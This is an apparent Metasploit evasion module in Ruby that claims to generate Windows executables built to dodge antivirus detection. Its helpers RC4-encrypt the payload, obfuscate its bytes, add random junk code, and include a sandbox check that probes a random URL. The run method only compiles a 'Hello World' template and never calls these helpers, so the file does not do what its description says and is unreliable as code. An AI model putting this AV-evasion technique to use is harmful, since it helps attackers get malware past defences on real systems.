##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'metasploit/framework/compiler/windows'

class MetasploitModule < Msf::Evasion

  def initialize(info={})
    super(merge_info(info,
      'Name'        => 'No shellcode defined, to reduce detection ratio',
      'Description' => %q{
        This module allows you to generate a Windows EXE without having a large shellcode in the file. and rather have it generated at runtime. This is useful for reducing the detection ratio of your payload.
        it will also use few technique to avoid runtime detection such as, 
        opening non existing files,
        querying time from a distant server->sleep->query time again.
        calling api function that are not fully emulated by avs.
       },
      'Author'      => [ 'Arthur RAOUT' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Targets'     => [ ['Microsoft Windows', {}] ]
    ))
  end

  def rc4_key
    @rc4_key ||= Rex::Text.rand_text_alpha(32..64)
  end


  def get_payload
    @c_payload ||= lambda {
      opts = { format: 'rc4', key: rc4_key }
      junk = Rex::Text.rand_text(10..1024)
      p = payload.encoded + junk

      return {
        size: p.length,
        hex_format: Msf::Simple::Buffer.transform(p, 'hex', 'buf', opts),
        c_format: Msf::Simple::Buffer.transform(p, 'c', 'buf', opts)
      }
    }.call
  end
def get_payload_bytes()
  payload = get_payload[:hex_format]
  s = ""
  i = 0
  j = 0
  vector = rand(1..1024)
  while j < get_payload[:size]
    s += "  buf[#{j}] = \'\\x#{((payload[i]+payload[i+1]).hex + vector).to_s(16).rjust(2, "0")}\'-#{vector};\n"
    i = i+2
    j = j+1
  end
  return s
end

def fill_array(size)
  s = ""
  i = 0
  while i < size
    if i == size-1
      s += "#{rand(1..1024)}"
    else
      s += "#{rand(1..1024)}, "
    end
    i = i+1
  end
  return s
end

def junk_code(flag) #if flag is 0 return a function , if flag is 1 return a call to a function
  #fibonnacci fucntion in junk 0
  fibonnacci = %Q|
  int fib(int n) {
    if (n <= 1)
      return n;
    return fib(n-1) + fib(n-2);
  }
  |
  bubbel_sort = %Q|
  void bubbel_sort(int arr[], int n) {
    int i, j, temp;
    for (i = 0; i < n; i++) {
      for (j = 0; j < n - i - 1; j++) {
        if (arr[j] > arr[j + 1]) {
          temp = arr[j];
          arr[j] = arr[j + 1];
          arr[j + 1] = temp;
        }
      }
    }
  }
  |
  euclide = %Q|
  int euclide(int a, int b) {
    if (a == 0)
      return b;
    return euclide(b % a, a);
  }
  |
  binary_search = %Q|
  int binary_search(int arr[], int l, int r, int x) {
    if (r >= l) {
      int mid = l + (r - l) / 2;
      if (arr[mid] == x)
        return mid;
      if (arr[mid] > x)
        return binary_search(arr, l, mid - 1, x);
      return binary_search(arr, mid + 1, r, x);
    }
    return -1;
  }
  |
  #fibonnacci call example
  fibonnacci_call = %Q|
  fib(#{rand(1..100)});
  |
  #bubbel sort call example
  arr_size = rand(1..100)
  bubbel_sort_call = %Q|
  int arr[#{arr_size}] = {#{fill_array(arr_size)}};
  bubbel_sort(arr, #{arr_size});
  |
  #euclide call example
  euclide_call = %Q|
  euclide(#{rand(1..100)}, #{rand(1..100)});
  |
  #binary search call example
  arr_size = rand(1..100)
  binary_search_call = %Q|
  int arr[#{arr_size}] = {#{fill_array(arr_size)}};
  binary_search(arr, 0, #{arr_size-1}, #{rand(1..100)});
  |
  if flag == 0
    return [fibonnacci, bubbel_sort, euclide, binary_search].shuffle
  else
    return [fibonnacci_call, bubbel_sort_call, euclide_call, binary_search_call].sample
  end
end

def get_includes()
  includes = ["#include <windows.h>\n", "#include <psapi.h>\n", "#include <wininet.h>\n"]
  includes.shuffle
  return includes.join
end


def get_check_url()
  fct_url = "int check_url() {\n"
  fct_url += "char url[] = \"https://www.#{Rex::Text.rand_text_alpha(rand(10..20))}.com\";\n"
  fct_url += "HINTERNET httpopen, openurl;\n"
  fct_url += "DWORD read;\n"
  fct_url += "httpopen=InternetOpen(NULL,INTERNET_OPEN_TYPE_DIRECT,NULL,NULL,0);\n"
  fct_url += "openurl=InternetOpenUrl(httpopen,url,NULL,NULL,INTERNET_FLAG_RELOAD\|INTERNET_FLAG_NO_CACHE_WRITE,NULL);\n"
  fct_url += "if (!openurl) // Access failed, we are not in AV\n"
  fct_url += "{\n"
  fct_url += "  #{junk_code(1)};\n"
  fct_url += "  InternetCloseHandle(httpopen);\n"
  fct_url += "  InternetCloseHandle(openurl);\n"
  fct_url += "  return 0;\n"
  fct_url += "}\n"
  fct_url += "InternetCloseHandle(httpopen);\n"
  fct_url += "InternetCloseHandle(openurl);\n"
  fct_url += "return 1;\n"
  fct_url += "}\n"
  return fct_url
end

  def c_template
    @c_template ||= %Q|
#include <windows.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  char str[] = "Hello World!";
  printf("%s\\n", str);
  return 0;
}|
  end

  def run
    # The randomized code allows us to generate a unique EXE
    m = Metasploit::Framework::Compiler::Mingw::X86.new({ show_compile_cmd: true, f_name: "OK", compile_options: " -lpsapi -lwininet " })
    bin = m.compile_c(c_template)
    print_status("Compiled executable size: #{bin.length}")
    file_create(bin)
  end

end
